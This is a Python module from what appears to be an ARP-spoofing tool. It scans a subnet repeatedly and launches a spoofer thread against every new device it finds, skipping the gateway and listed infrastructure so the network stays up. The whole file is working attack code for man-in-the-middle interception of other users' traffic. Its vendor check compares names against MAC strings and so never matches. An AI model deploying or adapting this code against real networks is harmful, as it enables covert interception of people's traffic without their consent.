# core/device_tracker.py

from scapy.all import ARP, Ether, srp
import threading
import time
from core.arp_spoofer import ArpSpoofer
from config import SUBNET, GATEWAY_IP, INTERFACE

# Devices that should not be spoofed
EXCLUDED_IPS = [
    GATEWAY_IP,
    "192.168.80.1",   # Juniper router
    "192.168.80.10",  # Cisco AP
    "192.168.80.11",  # Cisco AP
    "192.168.81.20",  # Duplicated Intel host
]

# Skip devices from these vendors to prevent collapse
BLACKLISTED_VENDORS = [
    "Cisco",
    "Juniper",
    "Ruijie",
    "CyberTAN",
    "Wistron",
    "Intel",
]

class DeviceTracker:
    def __init__(self):
        self.spoofed_targets = {}
        self.running = False
        self.seen_devices = {}

    def is_locally_administered(self, mac):
        try:
            first_octet = int(mac.split(":")[0], 16)
            return (first_octet & 0b10) != 0
        except:
            return True

    def is_blacklisted(self, mac, ip):
        if ip in EXCLUDED_IPS:
            return True
        vendor_mac = mac.lower()
        for vendor in BLACKLISTED_VENDORS:
            if vendor.lower() in vendor_mac:
                return True
        if self.is_locally_administered(mac):
            print(f"[?] Skipping {ip} - Locally administered MAC: {mac}")
            return True
        return False

    def scan_network(self):
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=SUBNET)
        ans, _ = srp(pkt, timeout=2, iface=INTERFACE, verbose=False)
        return {rcv.psrc: rcv.hwsrc for _, rcv in ans}

    def start_tracking(self):
        self.running = True
        print("[*] Starting dynamic device discovery...")
        while self.running:
            devices = self.scan_network()
            for ip, mac in devices.items():
                if ip in self.spoofed_targets:
                    continue
                if self.is_blacklisted(mac, ip):
                    print(f"[!] Skipping protected device: {ip} ({mac})")
                    continue
                if ip in self.seen_devices and self.seen_devices[ip] == mac:
                    continue  # already seen
                print(f"[+] New device found: {ip} — Spoofing...")
                self.seen_devices[ip] = mac
                spoofer = ArpSpoofer(ip, GATEWAY_IP, INTERFACE)
                self.spoofed_targets[ip] = spoofer
                threading.Thread(target=spoofer.spoof, daemon=True).start()
            time.sleep(10)

    def stop_tracking(self):
        self.running = False
        print("[*] Stopping tracker and spoofers...")
        for ip, spoofer in self.spoofed_targets.items():
            spoofer.stop()

    def list_devices(self):
        return list(self.spoofed_targets.keys())
